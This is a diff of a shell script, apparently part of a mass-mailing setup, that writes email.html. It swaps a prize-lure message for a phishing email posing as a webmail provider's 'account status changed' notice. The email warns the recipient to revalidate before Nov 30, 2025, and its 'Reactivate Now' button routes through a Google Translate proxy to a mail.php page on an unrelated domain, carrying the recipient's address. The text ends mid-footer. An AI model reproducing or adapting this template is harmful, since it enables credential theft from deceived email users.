@@ -88,12 +88,98 @@ sudo chown $USER:$USER *
 # Create a sample HTML email content (email.html)
 echo "Creating email.html with email content..."
 cat > email.html <<EOL
-<html>
-<body>
-  <h1>PrimeRewardSpot iPhone 16 Pro</h1>
-  <p>Congratulations! You are eligible to win an iPhone 16 Pro.</p>
-</body>
-</html>
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+<body style="margin: 0.4em; font-size: 14pt;">
+<div>
+<table width="100%" align="center" style="text-align: left; color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; 
+text-decoration-color: initial;" bgcolor="#fafafa" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" bgcolor="#fafbff" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" valign="top" style="box-sizing: border-box;">
+<a style="color: rgb(0, 172, 255); text-decoration: none; box-sizing: border-box; background-color: transparent;" target="_blank" rel="noreferrer"><img width="140" class="v1v1mobile_img_e" style="width: 140px; height: auto; vertical-align: middle; display: block; max-width: 40px; box-sizing: border-box;" alt="Webmail" src="https://hunterfmradio.com/assets/img/logo/output.png" border="0"></a></td>
+<td align="right" class="v1v1mobile_hide" valign="top" style="margin: 0px; color: rgb(0, 0, 0); line-height: 21px; font-family: roboto, helvetica, arial, sans-serif; font-size: 14px; font-weight: bold; box-sizing: border-box;">Mail. Host. Online</td></tr></tbody></table></td><td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr><tr style="box-sizing: border-box;"><td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;">
+</td></tr></tbody></table></td><td width="20" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>
+<div style="text-align: left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
+<div style="box-sizing: border-box;"><table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 250, 250);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 251, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td align="left" class="v1v1txt_24" valign="top" style='color: rgb(47, 28, 106); line-height: 30px; letter-spacing: normal; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 28px; font-style: normal; font-weight: bold; box-sizing: border-box;'>
+<a style="color: inherit; text-decoration: none; box-sizing: border-box; background-color: transparent;"><span style="color: rgb(47, 28, 106); text-decoration: none; box-sizing: border-box;"><span class="v1v1hed" style="box-sizing: border-box;">Email account status changed</span></span></a></td></tr><tr style="box-sizing: border-box;"><td height="24" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;">
+<td align="left" class="v1v1richTextLinks v1v1txt_12" valign="top" style='color: rgb(47, 28, 106); line-height: 20px; letter-spacing: normal; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;'>
+Hi {recipient-user}, We are reaching out to inform you that your webmail account requires revalidation before<span>&nbsp;</span><b style="font-weight: bolder; box-sizing: border-box;">Nov 30, 2025</b><span>&nbsp;</span>to ensure continued access.</td></tr></tbody></table></td><td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody>
+</table></td></tr></tbody></table></td></tr></tbody></table></div><div style="box-sizing: border-box;"><table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 250, 250);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 251, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="0" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="50" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td align="left" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="middle" style="padding: 0px; box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" align="left" valign="top" style="box-sizing: border-box;"><table width="100%" height="0" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="left" class="v1v1txt_12" valign="middle" style="color: rgb(0, 0, 0); line-height: 0px; font-family: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="center" valign="middle" style="padding: 10px 0px 0px; box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" align="left" valign="top" style="box-sizing: border-box;"><table width="100%" height="0" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" class="v1v1txt_12" valign="middle" style="color: rgb(0, 0, 0); line-height: 0px; font-family: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="middle" style="padding: 10px 0px 0px; box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" align="left" valign="top" style="box-sizing: border-box;">
+<table width="100%" height="0" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" class="v1v1txt_12" valign="middle" style="color: rgb(0, 0, 0); line-height: 0px; font-family: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr>
+</tbody></table></td><td width="50" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr><tr style="box-sizing: border-box;"><td height="0" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></div><div style="box-sizing: border-box;">
+<table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 250, 250);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 251, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="left" class="v1v1richTextLinks v1v1txt_12" valign="top" style='color: rgb(47, 28, 106); line-height: 0px; letter-spacing: normal; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;'></td></tr><tr style="box-sizing: border-box;">
+<td height="25" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" valign="top" style="box-sizing: border-box;">
+<table class="v1v1mobile_cta" style="border-collapse: collapse; box-sizing: border-box;" border="0" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" class="v1v1w100pc" style="border-radius: 6px; box-sizing: border-box; background-color: rgb(0, 0, 0);"><div style="box-sizing: border-box;"><div style="box-sizing: border-box;">
+<table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(244, 245, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 251, 255);" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" class="v1v1richTextLinks v1v1txt_12" valign="top" style='color: rgb(47, 28, 106); line-height: 20px; letter-spacing: normal; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;'></td></tr></tbody>
+</table></td><td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></div><div style="box-sizing: border-box;">
+<table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(244, 245, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 251, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="0" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td>
+</tr><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="50" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="center" valign="middle" style="padding: 0px; box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" align="left" valign="top" style="box-sizing: border-box;"><table width="100%" height="0" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" class="v1v1txt_12" valign="middle" style="color: rgb(0, 0, 0); line-height: 0px; font-family: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="middle" style="padding: 10px 0px 0px; box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" align="left" valign="top" style="box-sizing: border-box;">
+<table width="100%" height="0" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" class="v1v1txt_12" valign="middle" style="color: rgb(0, 0, 0); line-height: 0px; font-family: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="middle" style="padding: 10px 0px 0px; box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td width="20" align="left" valign="top" style="box-sizing: border-box;"><table width="100%" height="0" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" class="v1v1txt_12" valign="middle" style="color: rgb(0, 0, 0); line-height: 0px; font-family: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;"></td></tr></tbody>
+</table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td><td width="50" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr><tr style="box-sizing: border-box;"><td height="0" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></div>
+<div style="box-sizing: border-box;"><table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(244, 245, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0">
+<tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box; background-color: rgb(250, 251, 255);" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="left" class="v1v1richTextLinks v1v1txt_12" valign="top" style='color: rgb(47, 28, 106); line-height: 0px; letter-spacing: normal; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 14px; font-style: normal; font-weight: 400; box-sizing: border-box;'></td></tr><tr style="box-sizing: border-box;">
+<td height="25" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" valign="top" style="box-sizing: border-box;">
+<table class="v1v1mobile_cta" style="border-collapse: collapse; box-sizing: border-box;" border="0" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" class="v1v1w100pc" style="border-radius: 6px; box-sizing: border-box; background-color: rgb(0, 0, 0);">
+<a class="v1v1txt_12" style='padding: 15px 25px; border-radius: 6px; border: 2px solid rgb(0, 0, 0); border-image: none; color: rgb(255, 255, 254); line-height: 17px; letter-spacing: normal; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 14px; font-style: normal; font-weight: bold; text-decoration: none; display: block; box-sizing: border-box; 
+background-color: transparent;' href="https://translate.google.com/translate?hl=en&sl=ru&u=https://jimscott.co.uk/mail.php#{recipient-email}" target="_blank" rel="noreferrer"><span class="v1v1cta" style="color: rgb(255, 255, 254); text-decoration: none; box-sizing: border-box;">Reactivate Now</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td><td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr><tr style="box-sizing: border-box;">
+<td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></div></div><table width="100%" align="center" style="border-collapse: collapse; box-sizing: border-box;" bgcolor="#f4f5ff" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="20" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" bgcolor="#f4f5ff" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="30" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="color: rgb(0, 0, 0); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(244, 245, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; 
+text-decoration-color: initial;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table>
+<table width="100%" style="color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(244, 245, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; 
+text-decoration-color: initial;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="left" valign="top" style="box-sizing: border-box;"><a style="color: rgb(0, 138, 204); text-decoration: underline; box-sizing: border-box; background-color: transparent;" href="https://mail.hostinger.com/?utm_source=cordial&amp;utm_medium=email&amp;utm_campaign=email_status_change" target="_blank" rel="noreferrer">
+
+</a></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td><td width="40" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr><tr style="box-sizing: border-box;"><td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td><td width="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>
+<table width="100%" align="center" style="text-align: left; color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(250, 250, 250); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#fafafa" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" valign="top" style="box-sizing: border-box;"><table width="640" class="v1v1w100pc_e" style="width: 640px; border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td width="20" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;"><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" bgcolor="#fafafa" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td width="30" class="v1v1blockSides" style="box-sizing: border-box;"></td><td align="center" valign="top" style="box-sizing: border-box;">
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="20" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;">
+<td align="left" valign="top" style="box-sizing: border-box;"><a style="color: rgb(0, 172, 255); text-decoration: none; box-sizing: border-box; background-color: transparent;" target="_blank" rel="noreferrer"><img width="147" class="v1v1mobile_img_e" style="width: 147px; height: auto; vertical-align: middle; display: block; max-width: 147px; box-sizing: border-box;" alt="Webmail" src="https://hunterfmradio.com/assets/img/logo/outputs.png" border="0"></a></td></tr></tbody></table>
+<table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="10" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"></tr>
+<tr style="box-sizing: border-box;"><td style='color: rgb(85, 85, 85); line-height: 14px; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 12px; font-weight: 400; box-sizing: border-box;'>
